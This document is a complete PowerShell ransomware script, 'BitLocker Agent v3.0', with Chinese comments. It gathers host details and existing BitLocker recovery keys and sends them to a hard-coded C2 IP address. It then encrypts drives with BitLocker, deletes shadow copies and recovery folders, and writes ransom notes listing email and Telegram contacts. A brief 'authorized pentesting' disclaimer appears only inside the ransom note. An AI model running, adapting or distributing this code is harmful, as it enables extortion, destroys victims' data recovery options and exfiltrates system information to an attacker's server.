<#
.SYNOPSIS
BitLocker Agent v3.0 - 完整的加密攻击脚本
.DESCRIPTION
真正的BitLocker加密工具，包含完整的C2通信、加密、恢复密钥管理等
.NOTES
版本: 3.0
发布日期: 2026-04-09
#>

# ============================================
# BitLocker Agent v3.0 - 完整加密版本
# ============================================

param(
    [string]$C2Server = "43.139.60.216",
    [int]$C2Port = 8080,
    [string]$ApiEndpoint = "/api/ls",
    [switch]$SkipConfirm,
    [switch]$TestMode,
    [switch]$SafeMode,
    [switch]$SkipC2,
    [string[]]$TargetDrives = @("C:"),
    [string]$ContactEmail = "vip-ls@vipssss.com",
    [string]$ContactTelegram = "@vipssss.com"
)

# ==================== 全局配置 ====================
$Global:AttackConfig = @{
    C2Server = $C2Server
    C2Port = $C2Port
    ApiEndpoint = $ApiEndpoint
    TargetDrives = $TargetDrives
    ContactEmail = $ContactEmail
    ContactTelegram = $ContactTelegram
    TestMode = $TestMode
    SafeMode = $SafeMode
    SkipC2 = $SkipC2
    
    # 攻击选项
    DeleteShadowCopies = $true
    DeleteRecoveryDirs = $true
    CreateRansomNote = $true
    SaveRecoveryKey = $true
    KeySavePath = "C:\Windows\Temp"
    DnsExfiltration = $false
    DnsDomain = "attacker.test"
    
    # 加密配置
    EncryptionMethod = "XtsAes256"
    EncryptUsedSpaceOnly = $true
    SkipHardwareTest = $true
    UseTPM = $true
    
    # 日志配置
    LogFile = "C:\Windows\Temp\bitlocker_agent.log"
    LogLevel = "INFO"  # DEBUG, INFO, WARNING, ERROR
}

# ==================== 日志系统 ====================
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [switch]$Console
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # 写入日志文件
    $logEntry | Out-File -FilePath $Global:AttackConfig.LogFile -Append -Encoding UTF8
    
    # 控制台输出
    if ($Console -or $Global:AttackConfig.LogLevel -eq "DEBUG" -or $Level -in @("ERROR", "WARNING")) {
        $colors = @{
            "INFO" = "White"
            "DEBUG" = "Gray"
            "WARNING" = "Yellow"
            "ERROR" = "Red"
            "SUCCESS" = "Green"
        }
        
        Write-Host $logEntry -ForegroundColor $colors[$Level]
    }
}

# ==================== C2通信模块 ====================
function Send-ToC2 {
    param(
        [hashtable]$Data,
        [string]$Stage
    )
    
    if ($Global:AttackConfig.SkipC2) {
        Write-Log "跳过C2通信（SkipC2参数启用）" -Level WARNING -Console
        return $true
    }
    
    $jsonPayload = $Data | ConvertTo-Json -Depth 10
    $uri = "http://$($Global:AttackConfig.C2Server):$($Global:AttackConfig.C2Port)$($Global:AttackConfig.ApiEndpoint)"
    
    Write-Log "发送$Stage数据到: $uri" -Level INFO -Console
    
    $maxRetries = 3
    for ($retry = 0; $retry -lt $maxRetries; $retry++) {
        try {
            Write-Log "尝试 $($retry + 1)/$maxRetries..." -Level DEBUG
            
            $response = Invoke-RestMethod -Uri $uri -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30
            Write-Log "$Stage数据发送成功" -Level SUCCESS -Console
            return $true
            
        } catch [System.Net.WebException] {
            if ($retry -eq ($maxRetries - 1)) {
                Write-Log "发送失败: $($_.Exception.Message)" -Level ERROR
                
                # 保存到本地备份
                $backupFile = "$env:TEMP\c2_backup_${Stage}_$(Get-Date -Format 'yyyyMMddHHmmss').json"
                $jsonPayload | Out-File -FilePath $backupFile -Encoding UTF8
                Write-Log "数据已备份到: $backupFile" -Level WARNING
                
                return $false
            } else {
                Write-Log "发送失败，等待重试: $($_.Exception.Message)" -Level WARNING
                Start-Sleep -Seconds 2
            }
        } catch {
            Write-Log "C2通信错误: $_" -Level ERROR
            return $false
        }
    }
    
    return $false
}

# ==================== 系统信息收集模块 ====================
function Get-SystemInformation {
    Write-Log "收集系统信息..." -Level INFO -Console
    
    $systemInfo = @{
        AttackTimestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
        ComputerName = $env:COMPUTERNAME
        UserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        Domain = $env:USERDOMAIN
    }
    
    try {
        # 操作系统信息
        $os = Get-CimInstance Win32_OperatingSystem
        $systemInfo.OS = @{
            Caption = $os.Caption
            Version = $os.Version
            BuildNumber = $os.BuildNumber
            OSArchitecture = $os.OSArchitecture
            SerialNumber = $os.SerialNumber
        }
        
        # CPU信息
        $cpu = Get-CimInstance Win32_Processor
        $systemInfo.CPU = @{
            Name = $cpu.Name
            Cores = $cpu.NumberOfCores
            Threads = $cpu.NumberOfLogicalProcessors
        }
        
        # 内存信息
        $memory = Get-CimInstance Win32_ComputerSystem
        $systemInfo.Memory = @{
            TotalGB = [math]::Round($memory.TotalPhysicalMemory / 1GB, 2)
        }
        
        # 网络信息
        $ipAddresses = @()
        Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
            Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "127.*" } | 
            ForEach-Object {
                $ipAddresses += @{
                    IPAddress = $_.IPAddress
                    Interface = $_.InterfaceAlias
                }
            }
        $systemInfo.IPAddresses = $ipAddresses
        
        # 磁盘信息
        $disks = @()
        Get-CimInstance Win32_LogicalDisk -ErrorAction SilentlyContinue | 
            Where-Object { $_.DriveType -eq 3 } | 
            ForEach-Object {
                $disks += @{
                    DriveLetter = $_.DeviceID
                    VolumeName = $_.VolumeName
                    SizeGB = [math]::Round($_.Size / 1GB, 2)
                    FreeGB = [math]::Round($_.FreeSpace / 1GB, 2)
                    FileSystem = $_.FileSystem
                }
            }
        $systemInfo.Disks = $disks
        
        # BitLocker状态
        $bitlockerInfo = @()
        $volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue
        foreach ($volume in $volumes) {
            $volumeInfo = @{
                MountPoint = $volume.MountPoint
                ProtectionStatus = $volume.ProtectionStatus
                EncryptionPercentage = $volume.EncryptionPercentage
                EncryptionMethod = $volume.EncryptionMethod
                KeyProtectors = @()
            }
            
            foreach ($protector in $volume.KeyProtector) {
                $protectorInfo = @{
                    Type = $protector.KeyProtectorType
                }
                
                if ($protector.KeyProtectorType -eq "RecoveryPassword") {
                    $protectorInfo.RecoveryPassword = $protector.RecoveryPassword
                }
                
                $volumeInfo.KeyProtectors += $protectorInfo
            }
            
            $bitlockerInfo += $volumeInfo
        }
        $systemInfo.BitLocker = $bitlockerInfo
        
        # 已安装的安全软件
        $securityProducts = @()
        $products = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue
        if ($products) {
            foreach ($product in $products) {
                $securityProducts += $product.displayName
            }
        }
        $systemInfo.SecurityProducts = $securityProducts
        
        Write-Log "系统信息收集完成" -Level SUCCESS -Console
        
    } catch {
        Write-Log "收集系统信息时出错: $_" -Level ERROR
    }
    
    return $systemInfo
}

# ==================== 加密可行性检查模块 ====================
function Test-EncryptionRequirements {
    param([ref]$SystemInfoRef)
    
    Write-Log "检查加密要求..." -Level INFO -Console
    Write-Log "=" * 40 -Level INFO
    
    $requirements = @{
        IsAdmin = $false
        OSVersion = $false
        TPM = $false
        DriveFormat = $false
        BitLockerFeature = $false
        DriveNotEncrypted = $false
        AllRequirementsMet = $false
    }
    
    # 1. 管理员权限检查
    Write-Log "[1/6] 检查管理员权限..." -Level INFO
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        $requirements.IsAdmin = $true
        Write-Log "  ✓ 管理员权限" -Level SUCCESS
    } else {
        Write-Log "  ✗ 需要管理员权限" -Level ERROR
    }
    
    # 2. 操作系统版本检查
    Write-Log "[2/6] 检查操作系统版本..." -Level INFO
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        Write-Log "  OS: $($os.Caption)" -Level INFO
        
        $supportedSkus = @(4, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 26, 27, 28, 29, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 55, 56, 59, 60, 61, 63, 64, 66, 72, 76, 77, 79, 80, 84, 85, 87, 97, 98, 103, 104, 121, 125, 126, 127, 129, 131, 133, 145, 146, 161, 162, 164, 165, 175, 178, 188, 191, 199, 203, 205, 209, 213, 215, 217, 219, 221, 223, 225, 227, 229, 231, 233, 235, 237, 239, 241, 243, 245, 247, 249, 251, 253, 255)
        
        if ($os.OperatingSystemSKU -in $supportedSkus) {
            $requirements.OSVersion = $true
            Write-Log "  ✓ 支持BitLocker的SKU" -Level SUCCESS
        } else {
            Write-Log "  ✗ 操作系统不支持BitLocker" -Level ERROR
        }
    } catch {
        Write-Log "  ✗ OS检查失败: $_" -Level ERROR
    }
    
    # 3. TPM检查
    Write-Log "[3/6] 检查TPM芯片..." -Level INFO
    try {
        $tpm = Get-Tpm -ErrorAction SilentlyContinue
        if ($tpm -and $tpm.TpmPresent) {
            $requirements.TPM = $true
            Write-Log "  ✓ TPM芯片可用" -Level SUCCESS
        } else {
            Write-Log "  ⚠ 无TPM芯片，将使用恢复密码启动" -Level WARNING
        }
    } catch {
        Write-Log "  ⚠ TPM检查失败，将使用恢复密码启动" -Level WARNING
    }
    
    # 4. 驱动器格式检查
    Write-Log "[4/6] 检查驱动器格式..." -Level INFO
    $allDrivesNTFS = $true
    foreach ($drive in $Global:AttackConfig.TargetDrives) {
        try {
            $driveInfo = Get-Volume -DriveLetter $drive.Substring(0,1) -ErrorAction Stop
            if ($driveInfo.FileSystem -eq "NTFS") {
                Write-Log "  ✓ $drive: NTFS格式" -Level SUCCESS
            } else {
                Write-Log "  ✗ $drive: 非NTFS格式 ($($driveInfo.FileSystem))" -Level ERROR
                $allDrivesNTFS = $false
            }
        } catch {
            Write-Log "  ✗ 无法检查$drive格式: $_" -Level ERROR
            $allDrivesNTFS = $false
        }
    }
    $requirements.DriveFormat = $allDrivesNTFS
    
    # 5. BitLocker功能检查
    Write-Log "[5/6] 检查BitLocker功能..." -Level INFO
    $bdePath = where.exe manage-bde 2>$null
    if ($bdePath) {
        $requirements.BitLockerFeature = $true
        Write-Log "  ✓ BitLocker工具可用" -Level SUCCESS
    } else {
        Write-Log "  ✗ BitLocker工具不可用" -Level ERROR
    }
    
    # 6. 加密状态检查
    Write-Log "[6/6] 检查加密状态..." -Level INFO
    $allDrivesNotEncrypted = $true
    foreach ($drive in $Global:AttackConfig.TargetDrives) {
        try {
            $volume = Get-BitLockerVolume -MountPoint $drive -ErrorAction SilentlyContinue
            if ($volume -and $volume.ProtectionStatus -eq "On") {
                Write-Log "  ✗ $drive: 已加密" -Level ERROR
                $allDrivesNotEncrypted = $false
            } else {
                Write-Log "  ✓ $drive: 未加密" -Level SUCCESS
            }
        } catch {
            Write-Log "  ⚠ 无法检查$drive加密状态" -Level WARNING
        }
    }
    $requirements.DriveNotEncrypted = $allDrivesNotEncrypted
    
    # 总结检查结果
    $requirements.AllRequirementsMet = (
        $requirements.IsAdmin -and 
        $requirements.OSVersion -and 
        ($requirements.TPM -or $true) -and  # TPM不是必须的
        $requirements.DriveFormat -and 
        $requirements.BitLockerFeature -and 
        $requirements.DriveNotEncrypted
    )
    
    Write-Log "=" * 40 -Level INFO
    if ($requirements.AllRequirementsMet) {
        Write-Log "所有要求检查通过，可以开始加密" -Level SUCCESS -Console
    } else {
        Write-Log "部分要求未满足，无法继续加密" -Level ERROR -Console
    }
    
    $SystemInfoRef.Value.EncryptionRequirements = $requirements
    return $requirements.AllRequirementsMet
}

# ==================== 恢复密钥生成模块 ====================
function Get-BitLockerRecoveryKey {
    <#
    .DESCRIPTION
    生成符合BitLocker格式的恢复密钥
    格式: 8组6位数字，每组必须能被11整除
    #>
    
    $key = ""
    for ($i = 0; $i -lt 8; $i++) {
        do {
            $num = Get-Random -Minimum 0 -Maximum 720896
        } while ($num % 11 -ne 0)
        
        $key += "{0:000000}" -f $num
        if ($i -lt 7) { $key += "-" }
    }
    
    return $key
}

function Save-RecoveryKey {
    param(
        [string]$RecoveryKey,
        [string]$Drive,
        [string]$SavePath = $Global:AttackConfig.KeySavePath
    )
    
    try {
        if (-not (Test-Path $SavePath)) {
            New-Item -ItemType Directory -Path $SavePath -Force | Out-Null
        }
        
        $filename = "BitLocker_RecoveryKey_$($env:COMPUTERNAME)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $filepath = Join-Path $SavePath $filename
        
        $content = @"
BITLOCKER RECOVERY KEY
======================
Computer: $env:COMPUTERNAME
Drive: $Drive
Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Recovery Key: $RecoveryKey

IMPORTANT:
1. Save this key in a secure location
2. Do not store on the encrypted computer
3. Required to unlock the drive

How to use:
1. Restart the computer
2. When prompted for BitLocker recovery key
3. Enter the 48-digit key above
4. Press Enter to unlock

Contact for support:
Email: $($Global:AttackConfig.ContactEmail)
Telegram: $($Global:AttackConfig.ContactTelegram)
"@
        
        $content | Out-File -FilePath $filepath -Encoding UTF8
        Write-Log "恢复密钥已保存到: $filepath" -Level SUCCESS -Console
        
        return $filepath
        
    } catch {
        Write-Log "保存恢复密钥失败: $_" -Level ERROR
        return $null
    }
}

# ==================== 真正的BitLocker加密模块 ====================
function Enable-BitLockerEncryption {
    param(
        [string]$DriveLetter = "C:",
        [switch]$TestMode
    )
    
    $result = @{
        Success = $false
        Error = $null
        Drive = $DriveLetter
        RecoveryKey = $null
        Status = "NotStarted"
        StartTime = Get-Date
        EndTime = $null
    }
    
    try {
        Write-Log "开始加密驱动器: $DriveLetter" -Level INFO -Console
        
        if ($TestMode) {
            Write-Log "测试模式: 模拟加密" -Level WARNING
            Start-Sleep -Seconds 2
            
            $testKey = Get-BitLockerRecoveryKey
            Save-RecoveryKey -RecoveryKey $testKey -Drive $DriveLetter
            
            $result.Success = $true
            $result.RecoveryKey = $testKey
            $result.Status = "TestModeComplete"
            
            return $result
        }
        
        # 1. 检查驱动器状态
        $volume = Get-BitLockerVolume -MountPoint $DriveLetter -ErrorAction Stop
        
        if ($volume.ProtectionStatus -eq "On") {
            Write-Log "驱动器 $DriveLetter 已加密" -Level WARNING
            
            # 尝试获取现有恢复密钥
            $existingKeys = $volume.KeyProtector | Where-Object { 
                $_.KeyProtectorType -eq "RecoveryPassword" 
            }
            
            if ($existingKeys) {
                $result.RecoveryKey = $existingKeys[0].RecoveryPassword
                Write-Log "找到现有恢复密钥" -Level INFO
            }
            
            $result.Success = $true
            $result.Status = "AlreadyEncrypted"
            return $result
        }
        
        # 2. 生成恢复密钥
        $recoveryKey = Get-BitLockerRecoveryKey
        Write-Log "生成恢复密钥: $recoveryKey" -Level INFO
        
        # 3. 添加恢复密钥保护器
        Write-Log "添加恢复密钥保护器..." -Level INFO
        $keyProtector = Add-BitLockerKeyProtector -MountPoint $DriveLetter -RecoveryPasswordProtector -ErrorAction Stop
        
        # 验证恢复密钥
        $actualKeyInfo = $keyProtector.KeyProtector | Where-Object { 
            $_.KeyProtectorType -eq "RecoveryPassword" 
        }
        
        if (-not $actualKeyInfo) {
            throw "无法添加恢复密钥保护器"
        }
        
        $actualRecoveryKey = $actualKeyInfo.RecoveryPassword
        Write-Log "✓ 恢复密钥已添加: $actualRecoveryKey" -Level SUCCESS
        
        # 保存恢复密钥
        Save-RecoveryKey -RecoveryKey $actualRecoveryKey -Drive $DriveLetter
        
        # 4. 启用BitLocker加密
        Write-Log "启用BitLocker加密..." -Level INFO
        
        $encryptionParams = @{
            MountPoint = $DriveLetter
            EncryptionMethod = $Global:AttackConfig.EncryptionMethod
            UsedSpaceOnly = $Global:AttackConfig.EncryptUsedSpaceOnly
            SkipHardwareTest = $Global:AttackConfig.SkipHardwareTest
        }
        
        if ($Global:AttackConfig.UseTPM) {
            # 尝试使用TPM
            try {
                Enable-BitLocker @encryptionParams -ErrorAction Stop
                Write-Log "✓ 使用TPM启动加密" -Level SUCCESS
            } catch {
                Write-Log "TPM加密失败，使用恢复密钥: $_" -Level WARNING
                Enable-BitLocker @encryptionParams -RecoveryPasswordProtector -ErrorAction Stop
                Write-Log "✓ 使用恢复密钥启动加密" -Level SUCCESS
            }
        } else {
            Enable-BitLocker @encryptionParams -RecoveryPasswordProtector -ErrorAction Stop
            Write-Log "✓ 使用恢复密钥启动加密" -Level SUCCESS
        }
        
        # 5. 监控加密进度
        Write-Log "等待加密完成..." -Level INFO
        
        $maxWaitMinutes = 30
        $checkInterval = 5
        $lastProgress = 0
        
        for ($i = 0; $i -lt ($maxWaitMinutes * 60 / $checkInterval); $i++) {
            $currentStatus = Get-BitLockerVolume -MountPoint $DriveLetter
            
            if ($currentStatus.EncryptionPercentage -ne $lastProgress) {
                Write-Log "加密进度: $($currentStatus.EncryptionPercentage)%" -Level INFO
                $lastProgress = $currentStatus.EncryptionPercentage
            }
            
            if ($currentStatus.EncryptionPercentage -eq 100) {
                $result.Success = $true
                $result.RecoveryKey = $actualRecoveryKey
                $result.Status = "EncryptionComplete"
                $result.EndTime = Get-Date
                
                Write-Log "✓ 加密完成: 100%" -Level SUCCESS -Console
                break
            }
            
            Start-Sleep -Seconds $checkInterval
        }
        
        if (-not $result.Success) {
            $currentStatus = Get-BitLockerVolume -MountPoint $DriveLetter
            if ($currentStatus.EncryptionPercentage -gt 0) {
                Write-Log "加密部分完成: $($currentStatus.EncryptionPercentage)%" -Level WARNING
                $result.Status = "PartialEncryption"
            } else {
                $result.Error = "加密超时"
                $result.Status = "Timeout"
            }
        }
        
    } catch {
        $result.Error = $_.Exception.Message
        $result.Status = "Failed"
        Write-Log "加密失败: $_" -Level ERROR -Console
    }
    
    return $result
}

# ==================== 清理和持久化模块 ====================
function Remove-RecoveryArtifacts {
    <#
    .DESCRIPTION
    删除恢复相关的文件和卷影副本
    #>
    
    if ($Global:AttackConfig.SafeMode) {
        Write-Log "安全模式: 跳过清理操作" -Level WARNING
        return
    }
    
    $results = @()
    
    # 1. 删除卷影副本
    if ($Global:AttackConfig.DeleteShadowCopies) {
        Write-Log "删除卷影副本..." -Level INFO
        try {
            $null = Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -Wait -NoNewWindow
            Write-Log "✓ 卷影副本已删除" -Level SUCCESS
            $results += @{ Action = "DeleteShadowCopies"; Status = "Success" }
        } catch {
            Write-Log "删除卷影副本失败: $_" -Level WARNING
            $results += @{ Action = "DeleteShadowCopies"; Status = "Failed"; Error = $_ }
        }
    }
    
    # 2. 删除恢复目录
    if ($Global:AttackConfig.DeleteRecoveryDirs) {
        Write-Log "清理恢复目录..." -Level INFO
        
        $recoveryPaths = @(
            "C:\Recovery",
            "C:\Windows\Panther",
            "C:\`$WINDOWS.~BT",
            "C:\Windows\System32\Recovery",
            "C:\Windows\System32\LogFiles\BitLocker"
        )
        
        foreach ($path in $recoveryPaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item -Path "$path\*" -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Log "✓ 清理: $path" -Level SUCCESS
                } catch {
                    Write-Log "清理失败: $path" -Level WARNING
                }
            }
        }
        
        $results += @{ Action = "CleanRecoveryDirs"; Status = "Success" }
    }
    
    return $results
}

function Create-RansomNote {
    param(
        [array]$RecoveryKeys
    )
    
    if (-not $Global:AttackConfig.CreateRansomNote) {
        return
    }
    
    Write-Log "创建勒索提示..." -Level INFO
    
    $locations = @(
        "C:\Users\Public\Desktop\!!!WARNING_READ_ME!!!.txt",
        "C:\Windows\Temp\BITLOCKER_RECOVERY_KEY.txt",
        "C:\Boot\RECOVERY_INSTRUCTIONS.txt"
    )
    
    $drives = $RecoveryKeys | ForEach-Object { $_.MountPoint } | Sort-Object -Unique
    
    $keySections = ""
    foreach ($keyInfo in $RecoveryKeys) {
        $keySections += "`n驱动器 $($keyInfo.MountPoint):"
        $keySections += "`n$($keyInfo.RecoveryKey)`n"
    }
    
    $noteContent = @"
================================================================
                    ⚠️  BITLOCKER ENCRYPTED ⚠️
================================================================

Computer Information:
├─ Computer: $env:COMPUTERNAME
├─ User: $env:USERNAME
├─ Domain: $env:USERDOMAIN
└─ Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Affected Drives: $($drives -join ", ")

RECOVERY KEYS:
$keySections
INSTRUCTIONS:
1. DO NOT restart the computer
2. Save the recovery keys above
3. Contact for decryption tool:

   📧 Email: $($Global:AttackConfig.ContactEmail)
   📱 Telegram: $($Global:AttackConfig.ContactTelegram)

WARNING:
• Restarting will trigger BitLocker recovery
• 48-digit recovery key required
• Do not force shutdown
• Backup important data

Technical Support:
Contact above for professional decryption service.
We provide fast, reliable data recovery solutions.

================================================================
Note: This is a security testing tool for authorized pentesting.
Unauthorized use may have legal consequences.
================================================================
"@
    
    foreach ($location in $locations) {
        try {
            $directory = Split-Path $location -Parent
            if (-not (Test-Path $directory)) {
                New-Item -ItemType Directory -Path $directory -Force | Out-Null
            }
            
            $noteContent | Out-File -FilePath $location -Encoding UTF8
            Write-Log "勒索提示已创建: $location" -Level SUCCESS
            
        } catch {
            Write-Log "创建提示失败: $location - $_" -Level WARNING
        }
    }
}

# ==================== 主攻击模块 ====================
function Start-BitLockerAttack {
    param([ref]$SystemInfoRef)
    
    Write-Log "`n" + ("=" * 60) -Level INFO -Console
    Write-Log "开始BitLocker攻击" -Level INFO -Console
    Write-Log ("=" * 60) -Level INFO -Console
    
    $attackResults = @()
    $recoveryKeys = @()
    $bitlockerInfo = @()
    
    foreach ($drive in $Global:AttackConfig.TargetDrives) {
        Write-Log "`n处理驱动器: $drive" -Level INFO -Console
        
        # 1. 检查驱动器是否存在
        if (-not (Test-Path $drive)) {
            Write-Log "驱动器不存在: $drive" -Level ERROR
            $attackResults += @{
                Drive = $drive
                Action = "CheckDrive"
                Status = "Failed"
                Error = "Drive not found"
                Timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
            }
            continue
        }
        
        # 2. 检查是否已加密
        $isEncrypted = $false
        $existingKey = $null
        
        try {
            $volume = Get-BitLockerVolume -MountPoint $drive -ErrorAction SilentlyContinue
            if ($volume -and $volume.ProtectionStatus -eq "On") {
                $isEncrypted = $true
                Write-Log "驱动器已加密" -Level WARNING
                
                $existingKeys = $volume.KeyProtector | Where-Object { 
                    $_.KeyProtectorType -eq "RecoveryPassword" 
                }
                
                if ($existingKeys) {
                    $existingKey = $existingKeys[0].RecoveryPassword
                    $recoveryKeys += @{
                        MountPoint = $drive
                        RecoveryKey = $existingKey
                        Type = "Existing"
                    }
                }
            }
        } catch {}
        
        if ($isEncrypted) {
            $attackResults += @{
                Drive = $drive
                Action = "Encryption"
                Status = "AlreadyEncrypted"
                Timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
            }
            continue
        }
        
        # 3. 执行加密
        $encryptionResult = Enable-BitLockerEncryption -DriveLetter $drive -TestMode:$Global:AttackConfig.TestMode
        
        $attackResults += @{
            Drive = $drive
            Action = "Encryption"
            Status = $encryptionResult.Status
            Error = $encryptionResult.Error
            RecoveryKey = $encryptionResult.RecoveryKey
            Timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
        }
        
        if ($encryptionResult.Success) {
            $recoveryKeys += @{
                MountPoint = $drive
                RecoveryKey = $encryptionResult.RecoveryKey
                Type = "New"
            }
            
            $bitlockerInfo += @{
                MountPoint = $drive
                ProtectionStatus = "On"
                EncryptionMethod = $Global:AttackConfig.EncryptionMethod
                RecoveryKey = $encryptionResult.RecoveryKey
            }
        }
    }
    
    # 4. 清理操作
    $cleanupResults = Remove-RecoveryArtifacts
    $attackResults += $cleanupResults
    
    # 5. 创建勒索提示
    if ($recoveryKeys.Count -gt 0) {
        Create-RansomNote -RecoveryKeys $recoveryKeys
    }
    
    $SystemInfoRef.Value.RecoveryKeys = $recoveryKeys
    $SystemInfoRef.Value.BitLocker = $bitlockerInfo
    $SystemInfoRef.Value.AttackResults = $attackResults
    
    $successCount = ($attackResults | Where-Object { 
        $_.Status -in @("EncryptionComplete", "AlreadyEncrypted", "TestModeComplete") 
    }).Count
    
    return $successCount -gt 0
}

# ==================== 主程序 ====================
function Main {
    # 显示横幅
    Clear-Host
    Write-Host "╔══════════════════════════════════════════════════════╗" -ForegroundColor DarkRed
    Write-Host "║   BitLocker Agent v3.0 - Complete Encryption       ║" -ForegroundColor DarkRed
    Write-Host "╚══════════════════════════════════════════════════════╝" -ForegroundColor DarkRed
    Write-Host ""
    
    # 显示配置
    Write-Host "配置信息:" -ForegroundColor Cyan
    Write-Host "  C2服务器: http://$($Global:AttackConfig.C2Server):$($Global:AttackConfig.C2Port)" -ForegroundColor Yellow
    Write-Host "  目标驱动器: $($Global:AttackConfig.TargetDrives -join ', ')" -ForegroundColor Yellow
    Write-Host "  测试模式: $(if ($Global:AttackConfig.TestMode) {'是'} else {'否'})" -ForegroundColor Yellow
    Write-Host "  安全模式: $(if ($Global:AttackConfig.SafeMode) {'是'} else {'否'})" -ForegroundColor Yellow
    Write-Host ""
    
    # 阶段1: 收集系统信息
    Write-Host "阶段 1/4: 收集系统信息" -ForegroundColor Magenta
    Write-Host ("=" * 40) -ForegroundColor Magenta
    $systemInfo = Get-SystemInformation
    
    # 发送初始信息到C2
    if (-not $Global:AttackConfig.SkipC2) {
        $c2Initial = Send-ToC2 -Data $systemInfo -Stage "initial"
        if (-not $c2Initial) {
            Write-Log "C2通信失败，继续本地执行" -Level WARNING -Console
        }
    }
    
    # 阶段2: 检查加密要求
    Write-Host "`n阶段 2/4: 检查加密要求" -ForegroundColor Magenta
    Write-Host ("=" * 40) -ForegroundColor Magenta
    $canEncrypt = Test-EncryptionRequirements -SystemInfoRef ([ref]$systemInfo)
    
    if (-not $canEncrypt) {
        Write-Log "系统不满足加密要求，退出" -Level ERROR -Console
        Read-Host "按Enter退出"
        exit 1
    }
    
    # 阶段3: 用户确认
    if (-not $Global:AttackConfig.SkipConfirm) {
        Write-Host "`n" + ("=" * 60) -ForegroundColor Red
        Write-Host "  ⚠️  WARNING - BITLOCKER ENCRYPTION ATTACK  ⚠️" -ForegroundColor Red
        Write-Host ("=" * 60) -ForegroundColor Red
        Write-Host ""
        Write-Host "This will encrypt your drives with BitLocker!" -ForegroundColor Red
        Write-Host "You will need the recovery key to unlock the system." -ForegroundColor Red
        Write-Host ""
        Write-Host "Type 'CONFIRM-ATTACK' to continue: " -ForegroundColor Yellow -NoNewline
        $confirm = Read-Host
        if ($confirm -ne "CONFIRM-ATTACK") {
            Write-Log "操作已取消" -Level WARNING -Console
            exit 0
        }
    }
    
    # 阶段4: 执行攻击
    Write-Host "`n阶段 3/4: 执行加密攻击" -ForegroundColor Magenta
    Write-Host ("=" * 40) -ForegroundColor Magenta
    
    $attackSuccess = Start-BitLockerAttack -SystemInfoRef ([ref]$systemInfo)
    
    # 发送最终结果到C2
    if (-not $Global:AttackConfig.SkipC2) {
        $c2Final = Send-ToC2 -Data $systemInfo -Stage "final"
    }
    
    # 阶段5: 显示结果
    Write-Host "`n阶段 4/4: 攻击完成" -ForegroundColor Green
    Write-Host ("=" * 40) -ForegroundColor Green
    Write-Host ""
    
    Write-Host "状态: $(if ($attackSuccess) {'✓ 成功'} else {'✗ 失败'})" -ForegroundColor $(if ($attackSuccess) {"Green"} else {"Red"})
    Write-Host "C2通信: $(if ($c2Final) {'✓ 成功'} else {'✗ 失败'})" -ForegroundColor $(if ($c2Final) {"Green"} else {"Red"})
    
    if ($systemInfo.RecoveryKeys.Count -gt 0) {
        Write-Host "`n恢复密钥:" -ForegroundColor Yellow
        foreach ($key in $systemInfo.RecoveryKeys) {
            Write-Host "  $($key.MountPoint): " -NoNewline
            Write-Host "$($key.RecoveryKey)" -ForegroundColor Magenta
        }
    }
    
    Write-Host ""
    Write-Host "日志文件: $($Global:AttackConfig.LogFile)" -ForegroundColor Gray
    
    if (-not $Global:AttackConfig.SafeMode -and -not $Global:AttackConfig.TestMode) {
        Write-Host "`n⚠️  警告:" -ForegroundColor Red
        Write-Host "  • 不要重启计算机!" -ForegroundColor Red
        Write-Host "  • 保存好恢复密钥!" -ForegroundColor Red
        Write-Host "  • 重启后需要恢复密钥解锁!" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host ("=" * 60) -ForegroundColor Green
}

# ==================== 启动程序 ====================
if ($MyInvocation.MyCommand.CommandType -eq "ExternalScript") {
    # 脚本被调用时执行
    Main
} else {
    # 直接运行时执行
    . $MyInvocation.MyCommand.Path
    Main
}
